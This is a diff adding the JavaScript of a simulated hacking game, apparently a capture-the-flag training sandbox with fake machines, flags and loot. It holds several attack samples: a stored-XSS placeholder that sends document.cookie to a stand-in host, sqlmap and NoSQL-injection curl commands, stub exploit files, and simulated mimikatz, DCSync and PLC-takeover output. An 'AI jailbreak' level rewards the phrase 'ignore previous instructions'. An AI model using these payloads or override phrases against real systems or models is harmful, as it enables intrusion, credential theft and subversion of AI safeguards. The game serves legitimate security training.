+      pg.innerHTML='<div class="pt">vBulletin 5.6.4</div><div class="eb">Need credentials first!</div><div class="wb">[!] Hint: password from wp_config.txt is reused here</div><div style="font-size:10px;color:var(--dim);margin-top:6px;">cat wp_config.txt -> find DB_PASSWORD -> try on vb-forum admin</div>';
+    } else {
+      pg.innerHTML='<div class="pt">vBulletin 5.6.4</div><div class="wb">[!] Blind SQLi in /search.php?q=</div>'+
+        '<div style="font-size:10px;color:var(--dim);margin:6px 0;">sqlmap -u "http://192.168.1.14/search.php?q=test" --level=3 --technique=T</div>'+
+        '<div style="margin-top:10px;color:var(--dim);font-size:10px;">Stored XSS:</div>'+
+        '<textarea class="bi" id="xssin" placeholder="&lt;script&gt;fetch(\'//x/?c=\'+document.cookie)&lt;/script&gt;" style="margin-top:4px;min-height:48px;"></textarea>'+
+        '<button class="bb3" onclick="doXSS()">Post Comment</button><div id="xssres"></div>';
+    }
+  } else if(ul.includes('ai.local')){
+    pg.innerHTML='<div class="pt">&#129302; ShadowAI v1.0</div><textarea class="bi" id="aipr" placeholder="..." style="min-height:60px;margin-top:6px;"></textarea><button class="bb3" onclick="doAI()" style="width:100%;">Send</button><div id="aires" style="margin-top:8px;padding:8px;background:rgba(49,50,68,.3);border-radius:3px;font-size:10px;display:none;"></div>';
+  } else if(ul.includes('db-server')||ul.includes('192.168.1.15')){
+    if(!hasLoot('mongo_pass')){
+      pg.innerHTML='<div class="pt">DB Server</div><div class="eb">Need MongoDB connection string first!</div><div class="wb">[!] Find it in vb_dump.txt after vb-forum SQLi</div>';
+    } else {
+      pg.innerHTML='<div class="pt">DB Server — MongoDB</div><div class="wb">[!] NoSQL injection: {"$ne":null}</div>'+
+        '<div style="font-size:10px;color:var(--dim);margin:6px 0;">curl -H "Content-Type:application/json" -d \'{"username":{"$ne":null},"password":{"$ne":null}}\' http://192.168.1.15/api/login</div>'+
+        '<button class="bb3" onclick="document.getElementById(\'binp\').value=\'http://192.168.1.15/api/login?q=%7B%22%24ne%22:null%7D\';navBrowser()">Inject via GET</button>';
+    }
+  } else if(ul.includes('192.168.1.15')&&(ul.includes('ne')||ul.includes('null'))){
+    if(!hasLoot('mongo_pass')){pg.innerHTML='<div class="lockb">Need MongoDB creds first</div>';return;}
+    pg.innerHTML='<div class="pt">&#128274; MongoDB Bypassed!</div><div class="fb">FLAG{N0SQL_1nj3ct10n_W1n}</div><pre style="font-size:10px;color:var(--yellow);">[{"username":"admin","password":"Adm1n_P@ss_L34k3d"}]</pre>';
+    discoverLoot('redis_token');discoverLoot('vault_root');captureFlag('FLAG{N0SQL_1nj3ct10n_W1n}');
+  } else {
+    pg.innerHTML='<div style="color:var(--dim);font-size:11px;padding:10px 0;">'+esc(url)+'<br><br>Use quick links or type URL directly.</div>';
+  }
+}
+
+function doUpload(){var v=($('uf')||{value:''}).value||'',res=$('upres');if(!res)return;if(v.toLowerCase().includes('.php')){res.innerHTML='<div class="fb" style="margin-top:5px;">FLAG{F1l3_Upl04d_Sh3ll}</div>';captureFlag('FLAG{F1l3_Upl04d_Sh3ll}');}else{res.innerHTML='<div class="wb" style="margin-top:5px;">[!] Try: shell.php.jpg</div>';}}
+function doXSS(){var v=($('xssin')||{value:''}).value||'',res=$('xssres');if(!res)return;if(v.includes('<script>')&&v.includes('cookie')){res.innerHTML='<div class="fb" style="margin-top:5px;">FLAG{XSS_St0r3d_Succ3ss}</div>';captureFlag('FLAG{XSS_St0r3d_Succ3ss}');}else if(v.includes('<script>')){res.innerHTML='<div class="wb">Needs document.cookie exfil</div>';}else{res.innerHTML='<div style="font-size:10px;color:var(--dim);">Posted: "'+esc(v)+'"</div>';}}
+function doAI(){var v=(($('aipr')||{}).value||'').toLowerCase(),res=$('aires');if(!res)return;res.style.display='block';if(v.includes('ignore')&&(v.includes('instruction')||v.includes('previous'))){res.innerHTML='<div class="fb">FLAG{A1_J41lbr34k}</div>';captureFlag('FLAG{A1_J41lbr34k}');}else{res.innerHTML='<span style="color:var(--red);">Access denied.</span><br><span style="color:var(--dim);">Hint: "ignore previous instructions"</span>';}}
+
+/* ═══════════════════════════════════════════════
+   FILE MANAGER
+═══════════════════════════════════════════════ */
+function buildFileTree(){
+  $('ftree').innerHTML=
+    '<li class="ldir" onclick="toggleDir(this)">&#128194; exploits<ul style="display:none;padding-left:12px;list-style:none;">'+
+      '<li class="lexe" onclick="showFP(\'buffer_overflow.c\',\'void vuln(char *in){char buf[64];strcpy(buf,in);}\\n// overflow at offset 72\\nint main(){char p[512];gets(p);vuln(p);}\')">&#128196; buffer_overflow.c</li>'+
+      '<li class="lexe" onclick="showFP(\'jwt_forge.py\',\'h={"alg":"none"}\\np={"user":"admin","role":"superadmin"}\\ntoken=b64(h)+"."+b64(p)+"."\\n# Need JWT_SECRET from db_dump.txt\')">&#128196; jwt_forge.py</li>'+
+      '<li class="lexe" onclick="showFP(\'race_condition.py\',\'for i in range(50):\\n  threading.Thread(target=do_transfer).start()\')">&#128196; race_condition.py</li>'+
+      '<li class="lexe" onclick="showFP(\'drupalgeddon2.py\',\'# CVE-2018-7600\\n# Needs: config.bak from ftp.shadowlab\\npython3 drupalgeddon2.py <target>\')">&#128196; drupalgeddon2.py</li>'+
+      '<li class="lexe" onclick="showFP(\'eternalblue.py\',\'# MS17-010\\n# Needs: VPN connection to 172.16.0.0/24\\npython3 eternalblue.py <target>\')">&#128196; eternalblue.py</li>'+
+      '<li class="lexe" onclick="showFP(\'gitlab_rce.py\',\'# CVE-2021-22205\\n# Needs: domain compromise\\npython3 gitlab_rce.py <target>\')">&#128196; gitlab_rce.py</li>'+
+      '<li class="lexe" onclick="showFP(\'dcsync.py\',\'# DCSync via impacket\\n# Needs: DC NTLM hash\\npython3 dcsync.py shadow.corp <NTLM>\')">&#128196; dcsync.py</li>'+
+    '</ul></li>'+
+    '<li class="ldir" onclick="toggleDir(this)">&#128194; wordlists<ul style="display:none;padding-left:12px;list-style:none;">'+
+      '<li class="lfile">&#128196; rockyou.txt (14.3M)</li><li class="lfile">&#128196; darkweb2024.txt</li>'+
+    '</ul></li>'+
+    '<li class="lfile" onclick="showFP(\'notes.txt\',\'Attack path:\\n1. nmap 192.168.1.0/24\\n2. sqlmap target1 --dbs --tables --dump\\n3. Use loot from each machine for next\')">&#128196; notes.txt</li>'+
+    '<li class="lfile" onclick="showFP(\'scope.txt\',\'192.168.1.0/24  DMZ\\n10.10.0.0/24    Internal (pivot)\\n172.16.0.0/24   OT/SCADA (VPN)\\n10.99.0.0/24    Security (route)\')">&#128196; scope.txt</li>';
+}
+function toggleDir(el){var ul=el.querySelector('ul');if(ul)ul.style.display=ul.style.display==='none'?'block':'none';}
+function showFP(name,content){var p=$('fprev');p.textContent=name+'\n'+'-'.repeat(28)+'\n'+content;p.classList.add('on');}
+
+/* ═══════════════════════════════════════════════
+   PROXY
+═══════════════════════════════════════════════ */
+function initProxy(){G.proxyLog=[{method:'GET',url:'http://192.168.1.10/login?id=1',code:200,time:'09:11'},{method:'POST',url:'http://192.168.1.10/login',code:302,time:'09:12'}];renderProxy();}
+function addProxy(m,url,code){G.proxyLog.push({method:m,url:url,code:code,time:new Date().toTimeString().slice(0,5)});renderProxy();}
+function renderProxy(){var t=$('ptable');if(!t)return;t.innerHTML=G.proxyLog.map(function(h){var cc=h.code<300?'pc2':h.code<400?'pc3':'pc4';return '<div class="prow"><span class="pm">'+esc(h.method)+'</span><span class="pco '+cc+'">'+h.code+'</span><span class="pu3">'+esc(h.url)+'</span><span class="pt3">'+esc(h.time)+'</span></div>';}).join('');}
+function proxyReplay(){tText('[Proxy] Replay: bypass redirect','y');openWin('terminal');}
+function proxyClear(){G.proxyLog=[];renderProxy();}
+function proxyToggle(){G.intercept=!G.intercept;tText('[Proxy] Intercept: '+(G.intercept?'ON':'OFF'),G.intercept?'y':'d');openWin('terminal');}
+
+/* ═══════════════════════════════════════════════
+   WIFI
+═══════════════════════════════════════════════ */
+function wifiScan(){
+  var hasCap=G.deskFiles.some(function(f){return f.name==='handshake.cap';});
+  $('wlist').innerHTML=[
+    {bssid:'AA:BB:CC:DD:EE:01',ssid:'ShadowCorp_5G',enc:'WPA2',sig:'-42',ch:'6',main:true},
+    {bssid:'AA:BB:CC:DD:EE:02',ssid:'Office_Guest',enc:'WPA2',sig:'-55',ch:'11',main:false},
+    {bssid:'AA:BB:CC:DD:EE:04',ssid:'IoT_Network',enc:'WEP',sig:'-72',ch:'6',main:false}
+  ].map(function(n){
+    var hint=n.main&&hasCap?'<div style="font-size:9px;color:var(--cyan);margin-top:2px;">Tap to crack (handshake available)</div>':
+             n.main?'<div style="font-size:9px;color:var(--dim);">No handshake yet — complete vb-forum (M10) first</div>':'';
+    return '<div style="padding:7px 10px;border-radius:4px;margin:3px 0;border:1px solid var(--border);background:rgba(49,50,68,.3);cursor:pointer;font-size:10px;line-height:1.5;" onclick="crackWifi(\''+n.bssid+'\',\''+n.ssid+'\','+n.main+')">'+
+      '<div style="color:var(--fg);font-weight:700;">'+esc(n.ssid)+'</div>'+
+      '<span style="color:'+(n.enc==='WEP'?'var(--red)':'var(--yellow)')+'">'+esc(n.enc)+'</span> '+
+      '<span style="color:var(--dim);font-size:9px;">'+esc(n.bssid)+' ch'+esc(n.ch)+' '+esc(n.sig)+'dBm</span>'+
+      hint+'</div>';
+  }).join('');
+}
+
+function crackWifi(bssid,ssid,main){
+  var hasCap=G.deskFiles.some(function(f){return f.name==='handshake.cap';});
+  openWin('terminal');
+  if(!main||!hasCap){tText('[!] No handshake for '+ssid+'. Need vb-forum compromise first.','r');tBlank();return;}
+  if(!G.loot['vb_admin_pass']){tText('[!] handshake.cap requires vb-forum (M10) to be completed first.','r');tBlank();return;}
+  tText('aircrack-ng -w /root/wordlists/rockyou.txt handshake.cap','d');
+  tLine('<span class="b">                   Aircrack-ng 1.7</span>');tText('[*] Testing 14,344,391 keys...','d');
+  setTimeout(function(){tLine('<span class="g">                   KEY FOUND! [ shadow2024 ]</span>');discoverLoot('vb_admin_pass');captureFlag('FLAG{W1F1_H4ndsh4k3_Cr4ck3d}');tBlank();},2800);
+}
+
+/* ═══════════════════════════════════════════════
+   MISSIONS
+═══════════════════════════════════════════════ */
+function renderMissions(){
+  var done=Object.keys(G.flags).length;var mc=$('mcount');if(mc)mc.textContent=done;
+  var list=$('mlist');if(!list)return;
+  list.innerHTML=M.map(function(m,i){
+    var cap=!!G.flags[m.flag],unl=machineUnlocked(i);
+    var cls=cap?'done':unl?'':'lk';
+    var icon=cap?'&#9989;':unl?'&#11035;':'&#128274;';
+    var stepsHtml='';
+    if(G.hintsOn&&unl&&!cap){
+      stepsHtml='<div class="msteps">';
+      m.steps.forEach(function(s,si){stepsHtml+='<div class="step-todo">  '+(si+1)+'. '+esc(s)+'</div>';});
+      if(m.requires.length){stepsHtml+='<div style="color:var(--cyan);font-size:9px;margin-top:2px;">Requires: '+esc(m.requires.join(', '))+'</div>';}
+      stepsHtml+='</div>';
+    }
+    return '<div class="mitem '+cls+'">'+
+      '<div class="mname">'+icon+' M'+(i+1)+': '+esc(m.name)+'</div>'+
+      '<div class="mtgt">'+esc(m.ip)+' — '+esc(m.os)+'</div>'+
+      stepsHtml+'</div>';
+  }).join('');
+}
+
+/* ═══════════════════════════════════════════════
+   RDP SIMULATION
+═══════════════════════════════════════════════ */
+var RDP={machine:null};
+function openRDP(mIdx){
+  var m=M[mIdx];if(!m||!m.rdp)return;
+  RDP.machine=mIdx;
+  $('rdp-title').textContent='\u2b1b Remote Desktop \u2014 '+m.host;
+  $('rdp-conn').textContent=m.ip+':3389';
+  $('rdp-status').textContent='CONNECTING';$('rdp-status').style.color='#f9e2af';
+  $('rdp-msg-txt').textContent='Connecting to '+m.ip+'...';
+  $('rdp-bar').style.width='0%';
+  $('rdp-msg').style.display='flex';
+  $('rdp-out').textContent='';$('rdp-icons').innerHTML='';
+  var d=new Date();$('rdp-clk').textContent=d.getHours().toString().padStart(2,'0')+':'+d.getMinutes().toString().padStart(2,'0');
+  openWin('rdp');
+  var pct=0,t=setInterval(function(){pct+=Math.random()*20+8;if(pct>100)pct=100;$('rdp-bar').style.width=pct+'%';if(pct>=100){clearInterval(t);rdpConnected(mIdx);}},100);
+}
+
+function rdpConnected(mIdx){
+  var m=M[mIdx];
+  $('rdp-status').textContent='CONNECTED';$('rdp-status').style.color='#a6e3a1';
+  $('rdp-msg').style.display='none';
+  var icons=[{i:'&#128193;',l:'This PC'},{i:'&#128465;',l:'Recycle Bin'},{i:'&#128196;',l:'notes.txt'},{i:'&#128196;',l:'passwords.txt'}];
+  if(m.id==='ws')icons.push({i:'&#128196;',l:'mimikatz.exe'});
+  if(m.id==='dc')icons.push({i:'&#128196;',l:'secretsdump.txt'});
+  if(m.id==='backup')icons.push({i:'&#128196;',l:'veeam_creds.txt'});
+  if(m.id==='scada')icons.push({i:'&#128196;',l:'plc_tags.csv'});
+  if(m.id==='staging')icons.push({i:'&#128196;',l:'da_creds.txt'});
+  $('rdp-icons').innerHTML=icons.map(function(ic){return '<div style="display:flex;flex-direction:column;align-items:center;gap:2px;width:52px;padding:3px;border-radius:3px;cursor:pointer;color:#cdd6f4;font-size:8px;text-align:center;">'+ic.i+'<br>'+ic.l+'</div>';}).join('');
+  rdpPrint('Microsoft Windows [Version 10.0.19045]');rdpPrint('(c) Microsoft Corporation.');rdpPrint('');
+  rdpPrint('C:\\Users\\Administrator> whoami');rdpPrint(m.host+'\\Administrator');rdpPrint('');
+  $('rdp-prompt').textContent='C:\\Users\\Administrator> ';
+  setTimeout(function(){try{$('rdp-inp').focus();}catch(e){}},100);
+}
+
+function rdpPrint(t){var d=$('rdp-out');d.textContent+=t+'\n';d.scrollTop=d.scrollHeight;}
+
+function rdpKey(e){
+  if(e.key!=='Enter')return;
+  var inp=$('rdp-inp'),cmd=inp.value.trim();inp.value='';if(!cmd)return;
+  rdpPrint('C:\\Users\\Administrator> '+cmd);
+  var m=RDP.machine!==null?M[RDP.machine]:null;var cl=cmd.toLowerCase();
+  if(cl==='whoami'){rdpPrint((m?m.host:'WIN')+'\\Administrator');}
+  else if(cl==='ipconfig'){rdpPrint('   IPv4: '+(m?m.ip:'x.x.x.x')+'\n   Mask: 255.255.255.0');}
+  else if(cl==='dir'){
+    rdpPrint('Directory of C:\\Users\\Administrator\\Desktop\n');
+    rdpPrint('notes.txt          1,204');rdpPrint('passwords.txt         89');
+    if(m&&m.id==='ws')rdpPrint('mimikatz.exe    1,234,567');
+    if(m&&m.id==='dc')rdpPrint('secretsdump.txt    45,221');
+    if(m&&m.id==='staging')rdpPrint('da_creds.txt         412');
+  }
+  else if(cl.includes('type')&&(cl.includes('password')||cl.includes('notes'))){
+    rdpPrint('admin:SuperSecret2024!\nsvc_backup:Backupp@ss!\ndomain_admin:DA_Sh4d0w!');
+  }
+  else if(cl.includes('mimikatz')||cl.includes('sekurlsa')){
+    rdpPrint('  .#####.  mimikatz 2.2.0');rdpPrint('  [*] sekurlsa::logonpasswords');
+    rdpPrint('  Username: Administrator');rdpPrint('  NTLM: 8846f7eaee8fb117ad06bdd830b7586c');
+    rdpPrint('  Password: '+(m&&m.id==='ws'?'W1nd0ws!':'Pass@2024'));
+    if(m){
+      discoverLoot('win_ntlm');discoverLoot('win_pass');
+      captureFlag(m.flag);
+      if(m.id==='ws') captureFlag('FLAG{W1nd0ws_W0rkst4t10n_0wn3d}');
+      if(m.id==='staging') captureFlag('FLAG{ST4G1NG_RDP_0wn3d}');
+    }
+  }
+  else if(cl.includes('secretsdump')||cl.includes('dcsync')){
+    if(m&&(m.id==='dc'||m.id==='staging')){
+      rdpPrint('[*] DCSync...');rdpPrint('Administrator::8846f7eaee8fb117:::');rdpPrint('krbtgt::4e9815869d2090cc::: (Golden Ticket!)');rdpPrint('[+] Done.');
+      discoverLoot('dc_ntlm');discoverLoot('splunk_pass');discoverLoot('hsm_pin');discoverLoot('mainframe_pass');
+      if(m.id==='staging')captureFlag('FLAG{ST4G1NG_RDP_0wn3d}');
+      else captureFlag('FLAG{DCSync_D0m41n_0wn3d}');
+    } else rdpPrint('Access denied.');
+  }
+  else if((cl.includes('plcsim')||cl.includes('s7')||cl.includes('modbus'))&&m&&m.id==='scada'){
+    rdpPrint('[+] S7-300 at 192.168.100.1:102 - no auth\n[+] DB1: PUMP=1450RPM, P=4.2bar\n[+] Write access confirmed!');
+    discoverLoot('plc_access');captureFlag('FLAG{SCAD4_Pwn3d_1CS}');
+  }
+  else if(cl==='exit'||cl==='logoff'){closeWin('rdp');}
+  else if(cl==='help'){rdpPrint('whoami  ipconfig  dir  type passwords.txt\nmimikatz  secretsdump  dcsync  plcsim  exit');}
+  else rdpPrint("'"+cmd+"' is not recognized.");
+  rdpPrint('');
+}
+
+/* ═══════════════════════════════════════════════
+   START
+═══════════════════════════════════════════════ */
+window.addEventListener('resize',function(){if($('scr-desk').classList.contains('on')){G.deskIcons=[];renderDeskIcons();renderDeskFiles();}});
+runBoot();
+</script>
+</body>
+</html>
